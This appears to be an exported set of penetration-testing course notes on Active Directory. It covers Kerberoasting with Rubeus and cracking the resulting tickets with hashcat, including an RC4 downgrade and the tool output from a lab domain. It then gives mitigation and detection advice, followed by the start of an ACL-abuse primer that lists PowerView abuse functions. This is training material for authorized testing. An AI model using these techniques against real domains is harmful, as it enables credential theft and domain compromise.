9E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E\n```\n\n---\n\n## A Note on Encryption Types\n\nThe below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.\n\nKerberoasting tools typically request `RC4 encryption` when performing the attack and initiating TGS-REQ requests. This is because RC4 is [weaker](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with `$krb5tgs$23$*`, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with `$krb5tgs$18$*`. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using [Hashcat](https://github.com/hashcat/hashcat/pull/1955), it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.\n\nLet's start by creating an SPN account named `testspn` and using Rubeus to Kerberoast this specific user to test this out. As we can see, we received the TGS ticket RC4 (type 23) encrypted.\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> .\\Rubeus.exe kerberoast /user:testspn /nowrap\n\n[*] Action: Kerberoasting\n\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts.\n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\n\n[*] Target User            : testspn\n[*] Target Domain          : INLANEFREIGHT.LOCAL\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'\n\n[*] Total kerberoastable users : 1\n\n\n[*] SamAccountName         : testspn\n[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\n[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local\n[*] PwdLastSet             : 2/27/2022 12:15:43 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$CEA71B221FC2C00F8886261660536CC1$4A8E252D305475EB9410FF3E1E99517F90E27FB588173ACE3651DEACCDEC62165DE6EA1E6337F3640632FA42419A535B501ED1D4D1A0B704AA2C56880D74C2940170DC0747CE4D05B420D76BF298226AADB53F2AA048BE813B5F0CA7A85A9BB8C7F70F16F746807D3B84AA8FE91B8C38AF75FB9DA49ED133168760D004781963DB257C2339FD82B95C5E1F8F8C4BD03A9FA12E87E278915A8362DA835B9A746082368A155EBB5EFB141DC58F2E46B7545F82278AF4214E1979B35971795A3C4653764F08C1E2A4A1EDA04B1526079E6423C34F88BDF6FA2477D28C71C5A55FA7E1EA86D93565508081E1946D796C0B3E6666259FEB53804B8716D6D076656BA9D392CB747AD3FB572D7CE130940C7A6415ADDB510E2726B3ACFA485DF5B7CE6769EEEF08FE7290539830F6DA25C359894E85A1BCFB7E0B03852C7578CB52E753A23BE59AB9D1626091376BA474E4BAFAF6EBDD852B1854FF46AA6CD1F7F044A90C9497BB60951C4E82033406ACC9B4BED7A1C1AFEF41316A58487AFEA4D5C07940C87367A39E66415D9A54B1A88DADE1D4A0D13ED9E474BDA5A865200E8F111996B846E4E64F38482CEE8BE4FC2DC1952BFFBD221D7284EFF27327C0764DF4CF68065385D31866DA1BB1A189E9F82C46316095129F06B3679EE1754E9FD599EB9FE96C10315F6C45300ECCBEB6DC83A92F6C08937A244C458DB69B80CE85F0101177E6AC049C9F11701E928685F41E850CA62F047B175ADCA78DCA2171429028CD1B4FFABE2949133A32FB6A6DC9E0477D5D994F3B3E7251FA8F3DA34C58FAAE20FC6BF94CC9C10327984475D7EABE9242D3F66F81CFA90286B2BA261EBF703ADFDF7079B340D9F3B9B17173EBA3624D9B458A5BD1CB7AF06749FF3DB312BCE9D93CD9F34F3FE913400655B4B6F7E7539399A2AFA45BD60427EA7958AB6128788A8C0588023DDD9CAA4D35459E9DEE986FD178EB14C2B8300C80931624044C3666669A68A665A72A1E3ABC73E7CB40F6F46245B206777EE1EF43B3625C9F33E45807360998B7694DC2C70ED47B45172FA3160FFABAA317A203660F26C2835510787FD591E2C1E8D0B0E775FC54E44A5C8E5FD1123FBEDB463DAFDFE6A2632773C3A1652970B491EC7744757872C1DDC22BAA7B4723FEC91C154B0B4262637518D264ADB691B7479C556F1D10CAF53CB7C5606797F0E00B759FCA56797AAA6D259A47FCCAA632238A4553DC847E0A707216F0AE9FF5E2B4692951DA4442DF86CD7B10A65B786FE3BFC658CC82B47D9C256592942343D05A6F06D250265E6CB917544F7C87645FEEFA54545FEC478ADA01B8E7FB6480DE7178016C9DC8B7E1CE08D8FA7178D33E137A8C076D097C1C29250673D28CA7063C68D592C30DCEB94B1D93CD9F18A2544FFCC07470F822E783E5916EAF251DFA9726AAB0ABAC6B1EB2C3BF6DBE4C4F3DE484A9B0E06FF641B829B651DD2AB6F6CA145399120E1464BEA80DC3608B6C8C14F244CBAA083443EB59D9EF3599FCA72C6997C824B87CF7F7EF6621B3EAA5AA0119177FC480A20B82203081609E42748920274FEBB94C3826D57C78AD93F04400DC9626CF978225C51A889224E3ED9E3BFDF6A4D6998C16D414947F9E157CB1594B268BE470D6FB489C2C6C56D2AD564959C5\n```\n\nChecking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes\n\nserviceprincipalname                   msds-supportedencryptiontypes samaccountname\n--------------------                   ----------------------------- --------------\ntestspn/kerberoast.inlanefreight.local                            0 testspn\n```\n\nNext, let's crack this ticket using Hashcat and note how long it took. The account is set with a weak password found in the `rockyou.txt` wordlist for our purposes. Running this through Hashcat, we see that it took four seconds to crack on a CPU, and therefore it would crack almost instantly on a powerful GPU cracking rig and probably even on a single GPU.\n\n#### Cracking the Ticket with Hashcat & rockyou.txt\n\nKerberoasting - from Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt \n\nhashcat (v6.1.1) starting...\n\n<SNIP>64bea80dc3608b6c8c14f244cbaa083443eb59d9ef3599fca72c6997c824b87cf7f7ef6621b3eaa5aa0119177fc480a20b82203081609e42748920274febb94c3826d57c78ad93f04400dc9626cf978225c51a889224e3ed9e3bfdf6a4d6998c16d414947f9e157cb1594b268be470d6fb489c2c6c56d2ad564959c5:welcome1$\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: Kerberos 5, etype 23, TGS-REP\nHash.Target......: $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/ke...4959c5\nTime.Started.....: Sun Feb 27 15:36:58 2022 (4 secs)\nTime.Estimated...: Sun Feb 27 15:37:02 2022 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   693.3 kH/s (5.41ms) @ Accel:32 Loops:1 Thr:64 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 2789376/14344385 (19.45%)\nRejected.........: 0/2789376 (0.00%)\nRestore.Point....: 2777088/14344385 (19.36%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: westham76 -> wejustare\n\nStarted: Sun Feb 27 15:36:57 2022\nStopped: Sun Feb 27 15:37:04 2022\n```\n\nLet's assume that our client has set SPN accounts to support AES 128/256 encryption.\n\n![Active Directory Users and Computers window showing properties for user 'testspn' with account options and logon settings.](https://academy.hackthebox.com/storage/modules/143/aes_kerberoast.png)\n\nIf we check this with PowerView, we'll see that the `msDS-SupportedEncryptionTypes attribute` is set to `24`, meaning that AES 128/256 encryption types are the only ones supported.\n\n#### Checking Supported Encryption Types\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes\n\nserviceprincipalname                   msds-supportedencryptiontypes samaccountname\n--------------------                   ----------------------------- --------------\ntestspn/kerberoast.inlanefreight.local                            24 testspn\n```\n\nRequesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.\n\n#### Requesting a New Ticket\n\nKerberoasting - from Windows\n\n```powershell-session\nPS C:\\htb>  .\\Rubeus.exe kerberoast /user:testspn /nowrap\n\n[*] Action: Kerberoasting\n\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts.\n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\n\n[*] Target User            : testspn\n[*] Target Domain          : INLANEFREIGHT.LOCAL\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'\n\n[*] Total kerberoastable users : 1\n\n[*] SamAccountName         : testspn\n[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\n[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local\n[*] PwdLastSet             : 2/27/2022 12:15:43 PM\n[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96\n[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$8939F8C5B97A4CAA170AD706$84B0DD2C5A931E123918FFD64561BFE651F89F079A47053814244C0ECDF15DF136E5787FAC4341A1BDF6D5077EAF155A75ACF0127A167ABE4B2324C492ED1AF4C71FF8D51927B23656FCDE36C9A7AC3467E4DB6B7DC261310ED05FB7C73089763558DE53827C545FB93D25FF00B5D89FCBC3BBC6DDE9324093A3AADBE2C6FE21CFB5AFBA9DCC5D395A97768348ECCF6863EFFB4E708A1B55759095CCA98DE7DE0F7C149357365FBA1B73FCC40E2889EA75B9D90B21F121B5788E27F2FC8E5E35828A456E8AF0961435D62B14BADABD85D4103CC071A07C6F6080C0430509F8C4CDAEE95F6BCC1E3618F2FA054AF97D9ED04B47DABA316DAE09541AC8E45D739E76246769E75B4AA742F0558C66E74D142A98E1592D9E48CA727384EC9C3E8B7489D13FB1FDB817B3D553C9C00FA2AC399BB2501C2D79FBF3AF156528D4BECD6FF03267FB6E96E56F013757961F6E43838054F35AE5A1B413F610AC1474A57DE8A8ED9BF5DE9706CCDAD97C18E310EBD92E1C6CD5A3DE7518A33FADB37AE6672D15DACFE44208BAC2EABB729C24A193602C3739E2C21FB606D1337E1599233794674608FECE1C92142723DFAD238C9E1CB0091519F68242FBCC75635146605FDAD6B85103B3AFA8571D3727F11F05896103CB65A8DDE6EB29DABB0031DCF03E4B6D6F7D10E85E02A55A80CD8C93E6C8C3ED9F8A981BBEA01ABDEB306078973FE35107A297AF3985CF12661C2B8614D136B4AF196D27396C21859F40348639CD1503F517D141E2E20BB5F78818A1A46A0F63DD00FEF2C1785672B4308AE1C83ECD0125F30A2708A273B8CC43D6E386F3E1A520E349273B564E156D8EE7601A85D93CF20F20A21F0CF467DC0466EE458352698B6F67BAA9D65207B87F5E6F61FF3623D46A1911342C0D80D7896773105FEC33E5C15DB1FF46F81895E32460EEA32F423395B60582571551FF74D1516DDA3C3EBAE87E92F20AC9799BED20BF75F462F3B7D56DA6A6964B7A202FE69D9ED62E9CB115E5B0A50D5BBF2FD6A22086D6B720E1589C41FABFA4B2CD6F0EFFC9510EC10E3D4A2BEE80E817529483D81BE11DA81BBB5845FEC16801455B234B796728A296C65EE1077ABCF67A48B96C4BD3C90519DA6FF54049DE0BD72787F428E8707A5A46063CE57E890FC22687C4A1CF6BA30A0CA4AB97E22C92A095140E37917C944EDCB64535166A5FA313CEF6EEB5295F9B8872D398973362F218DF39B55979BDD1DAD5EC8D7C4F6D5E1BD09D87917B4562641258D1DFE0003D2CC5E7BCA5A0FC1FEC2398B1FE28079309BEC04AB32D61C00781C92623CA2D638D1923B3A94F811641E144E17E9E3FFB80C14F5DD1CBAB7A9B53FB5895DFC70A32C65A9996FB9752B147AFB9B1DFCBECA37244A88CCBD36FB1BF38822E42C7B56BB9752A30D6C8198B6D64FD08A2B5967414320D532F0404B3920A5F94352F85205155A7FA7EB6BE5D3A6D730318FE0BF60187A23FF24A84C18E8FC62DF6962D91D2A9A0F380987D727090949FEC4ADC0EF29C7436034A0B9D91BA36CC1D4C457392F388AB17E646418BA9D2C736B0E890CF20D425F6D125EDD9EFCA0C3DA5A6E203D65C8868EE3EC87B853398F77B91DDCF66BD942EC17CF98B6F9A81389489FCB60349163E10196843F43037E79E10794AC70F88225EDED2D51D26413D53\n```\n\nTo run this through Hashcat, we need to use hash mode `19700`, which is `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)` per the handy Hashcat [example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing `s` to see the status of the cracking job.\n\n#### Running Hashcat & Checking the Status of the Cracking Job\n\nKerberoasting - from Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt \n\nhashcat (v6.1.1) starting...\n\n<SNIP>\n\n[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s\n\nSession..........: hashcat\nStatus...........: Running\nHash.Name........: Kerberos 5, etype 18, TGS-REP\nHash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53\nTime.Started.....: Sun Feb 27 16:07:50 2022 (57 secs)\nTime.Estimated...: Sun Feb 27 16:31:06 2022 (22 mins, 19 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    10277 H/s (8.99ms) @ Accel:1024 Loops:64 Thr:1 Vec:8\nRecovered........: 0/1 (0.00%) Digests\nProgress.........: 583680/14344385 (4.07%)\nRejected.........: 0/583680 (0.00%)\nRestore.Point....: 583680/14344385 (4.07%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3264-3328\nCandidates.#1....: skitzy -> sammy<3\n\n[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>\n```\n\nWhen the hash finally cracks, we see that it took 4 minutes 36 seconds for a relatively simple password on a CPU. This would be greatly magnified with a stronger/longer password.\n\n#### Viewing the Length of Time it Took to Crack\n\nKerberoasting - from Windows\n\n```shell-session\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: Kerberos 5, etype 18, TGS-REP\nHash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53\nTime.Started.....: Sun Feb 27 16:07:50 2022 (4 mins, 36 secs)\nTime.Estimated...: Sun Feb 27 16:12:26 2022 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    10114 H/s (9.25ms) @ Accel:1024 Loops:64 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 2789376/14344385 (19.45%)\nRejected.........: 0/2789376 (0.00%)\nRestore.Point....: 2783232/14344385 (19.40%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4032-4095\nCandidates.#1....: wenses28 -> wejustare\n```\n\nWe can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.\n\n#### Using the /tgtdeleg Flag\n\n![Rubeus tool output showing kerberoasting action for user 'testspn' with RC4_HMAC and AES encryption types, displaying hash details.](https://academy.hackthebox.com/storage/modules/143/kerb_tgs_18.png)\n\nIn the above image, we can see that when supplying the `/tgtdeleg` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256. This simple example shows the importance of detailed enumeration and digging deeper when performing attacks such as Kerberoasting. Here we could downgrade from AES to RC4 and cut cracking time down by over 4 minutes and 30 seconds. In a real-world engagement where we have a strong GPU password cracking rig at our disposal, this type of downgrade could result in a hash cracking in a few hours instead of a few days and could make and break our assessment.\n\nNote: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.\n\nIt is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for `RC4_HMAC_MD5` would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.\n\n![Group Policy Management Editor showing security settings for Kerberos encryption types, including DES, RC4, and AES options.](https://academy.hackthebox.com/storage/modules/143/kerb_encrypt_types.png)\n\n---\n\n## Mitigation & Detection\n\nAn important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.\n\nKerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of `TGS-REQ` and `TGS-REP` requests and responses, signaling the use of automated Kerberoasting tools. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy.\n\n![Group Policy Management Editor showing audit settings for Kerberos Authentication Service with success and failure events configured.](https://academy.hackthebox.com/storage/modules/143/kerb_audit.png)\n\nDoing so will generate two separate event IDs: [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested, and [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed. 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.\n\nBelow we can see an example of a Kerberoasting attack being logged. We see many event ID 4769 being logged in succession, which appears to be anomalous behavior. Clicking into one, we can see that a Kerberos service ticket was requested by the `htb-student` user (attacker) for the `sqldev` account (target). We can also see that the ticket encryption type is `0x17`, which is the hex value for 23 (`DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256`), meaning that the requested ticket was RC4, so if the password was weak, there is a good chance that the attacker would be able to crack it and gain control of the `sqldev` account.\n\n![Event Viewer showing Security logs with Event ID 4769 for Kerberos Service Ticket Operations, detailing account and service information for htb-student@INLANEFREIGHT.LOCAL.](https://academy.hackthebox.com/storage/modules/143/4769.png)\n\nSome other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).\n\nThis excellent [post](https://adsecurity.org/?p=3458) by Sean Metcalf highlights some mitigation and detection strategies for Kerberoasting.\n\n---\n\n## Continuing Onwards\n\nNow that we have a set of (hopefully privileged) credentials, we can move on to see where we can use the credentials. We may be able to:\n\n- Access a host via RDP or WinRM as a local user or a local admin\n- Authenticate to a remote host as an admin using a tool such as PsExec\n- Gain access to a sensitive file share\n- Gain MSSQL access to a host as a DBA user, which can then be leveraged to escalate privileges\n\nRegardless of our access, we will also want to dig deeper into the domain for other flaws and misconfigurations that can help us expand our access and add to our report to provide more value to our clients.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/20-Access Control List (ACL) Abuse Primer",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/20-Access Control List (ACL) Abuse Primer.md",
    "title": "20 Access Control List (ACL) Abuse Primer",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a ser...",
    "category": "02_CPTS",
    "content": "\n---\n\nFor security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.\n\n---\n\n## Access Control List (ACL) Overview\n\nIn their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called `Access Control Entries` (`ACEs`). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.\n\nThere are two types of ACLs:\n\n1. `Discretionary Access Control List` (`DACL`) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.\n    \n2. `System Access Control Lists` (`SACL`) - allow administrators to log access attempts made to secured objects.\n    \n\nWe see the ACL for the user account `forend` in the image below. Each item under `Permission entries` makes up the `DACL` for the user account, while the individual entries (such as `Full Control` or `Change Password`) are ACE entries showing rights granted over this user object to various users and groups.\n\n#### Viewing forend's ACL\n\n![Active Directory Users and Computers window showing Advanced Security Settings for 'forend' with permission entries for various principals, including 'Authenticated Users' and 'Angela Dunn'.](https://academy.hackthebox.com/storage/modules/143/DACL_example.png)\n\nThe SACLs can be seen within the `Auditing` tab.\n\n#### Viewing the SACLs through the Auditing Tab\n\n![Active Directory Users and Computers window showing Advanced Security Settings for 'forend' with auditing entries for 'Everyone' on descendant organizational units.](https://academy.hackthebox.com/storage/modules/143/SACL_example.png)\n\n---\n\n## Access Control Entries (ACEs)\n\nAs stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are `three` main types of ACEs that can be applied to all securable objects in AD:\n\n|**ACE**|**Description**|\n|---|---|\n|`Access denied ACE`|Used within a DACL to show that a user or group is explicitly denied access to an object|\n|`Access allowed ACE`|Used within a DACL to show that a user or group is explicitly granted access to an object|\n|`System audit ACE`|Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred|\n\nEach ACE is made up of the following `four` components:\n\n1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)\n2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)\n3. A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object\n4. An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object\n\nWe can view this graphically in `Active Directory Users and Computers` (`ADUC`). In the example image below, we can see the following for the ACE entry for the user `forend`:\n\n#### Viewing Permissions through Active Directory Users & Computers\n\n![Active Directory Users and Computers window showing permission entry for Angela Dunn with various permissions like 'Read all properties' and 'Write all properties' for this object and all descendant objects.](https://academy.hackthebox.com/storage/modules/143/ACE_example.png)\n\n1. The security principal is Angela Dunn (adunn@inlanefreight.local)\n2. The ACE type is `Allow`\n3. Inheritance applies to the \"This object and all descendant objects,” meaning any child objects of the `forend` object would have the same permissions granted\n4. The rights granted to the object, again shown graphically in this example\n\nWhen access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.\n\n---\n\n## Why are ACEs Important?\n\nAttackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the \"low hanging fruit\" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:\n\n- `ForceChangePassword` abused with `Set-DomainUserPassword`\n- `Add Members` abused with `Add-DomainGroupMember`\n- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`\n- `GenericWrite` abused with `Set-DomainObject`\n- `WriteOwner` abused with `Set-DomainObjectOwner`\n- `WriteDACL` abused with `Add-DomainObjectACL`\n- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`\n- `Addself` abused with `Add-DomainGroupMember`\n\nIn this module, we will cover enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:\n\n- [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword) - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).\n- [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite) - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.\n- `AddSelf` - shows security groups that a user can add themselves to.\n- [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.\n\nThis graphic, adapted from a graphic created by [Charlie Bromberg (Shutdown)](https://twitter.com/_nwodtuhs), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux.\n\n![Flowchart showing WriteDacl and WriteOwner permissions with associated actions like Grant Rights, GenericWrite, and AddMember, including Linux and Windows tools for each action.](https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)\n\nWe will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the [ReadGMSAPassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readgmsapassword) edge. In this case, there are tools such as [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as [Unexpire-Password](https://learn.microsoft.com/en-us/windows/win32/adschema/r-unexpire-password) or [Reanimate-Tombstones](https://learn.microsoft.com/en-us/windows/win32/adschema/r-reanimate-tombstones) using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It's worth familiarizing yourself with all of the [BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) and as many Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) as possible as you never know when you may encounter a less common one during an assessment.\n\n---\n\n## ACL Attacks in the Wild\n\nWe can use ACL attacks for:\n\n- Lateral movement\n- Privilege escalation\n- Persistence\n\nSome common attack scenarios may include:\n\n|Attack|Description|\n|---|---|\n|`Abusing forgot password permissions`|Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.|\n|`Abusing group membership management`|It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth 